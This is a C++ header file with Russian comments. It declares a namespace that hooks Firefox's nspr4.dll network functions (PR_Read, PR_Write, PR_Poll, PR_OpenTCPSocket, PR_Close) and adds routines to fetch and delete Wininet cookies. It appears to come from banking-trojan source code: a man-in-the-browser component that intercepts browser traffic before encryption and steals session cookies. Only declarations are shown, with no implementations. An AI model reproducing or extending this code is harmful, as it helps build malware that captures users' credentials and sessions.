/*
  Перехват nspr4.dll
*/
#pragma once


//PRFileDesc.
typedef struct
{
	void *methods;
	void *secret;
	void *lower, *higher;
	void ( *dtor)(void *fd);
	int identity;
}PRFILEDESC;

//PRPollDesc
typedef struct
{
	PRFILEDESC* fd;
	__int16 in_flags;  //PR_POLL_*.
	__int16 out_flags; //PR_POLL_*.
}PRPOLLDESC;

namespace Nspr4Hook
{
	/*
		Инициализация.

	*/
	void init(void);

	/*
		Деинициализация.
	*/
	void uninit(void);

	/*
		Получение куков Wininet.
	*/
	void _getCookies(void);

	/*
		Удаление куков Wininet.
	*/
	void _removeCookies(void);

	/*
		Установка адерсов оригинальных функций. Функция должна вызываться в процессе ОДИН РАЗ.

		IN module       - модуль.
		IN readAddress  - адрес оригинальной PR_Read.
		IN writeAddress - адрес оригинальной PR_Write.
		IN pollAddress  - адрес оригинальной PR_Poll.
	*/
	void updateAddresses(HMODULE moduleHandle, void *openTcpSocket, void *close, void *readAddress, void *writeAddress, void *pollAddress);

	/*
		hook for PR_OpenTCPSocket.
	*/
	void *__cdecl hookerPrOpenTcpSocket(int af);

	/*
		Перехватчик PR_Close.
	*/
	int __cdecl hookerPrClose(void *fd);

	/*
		Перехватчик PR_Read.
	*/
	__int32 __cdecl hookerPrRead(void *fd, void *buf, __int32 amount);

	/*
		Перехватчик PR_Write.
	*/
	__int32 __cdecl hookerPrWrite(void *fd, const void *buf, __int32 amount);

	/*
		Hook for PR_Poll.
	*/
	__int32 __cdecl  hookerPrPoll(PRPOLLDESC *pds, int npds, unsigned __int32 timeout);

};
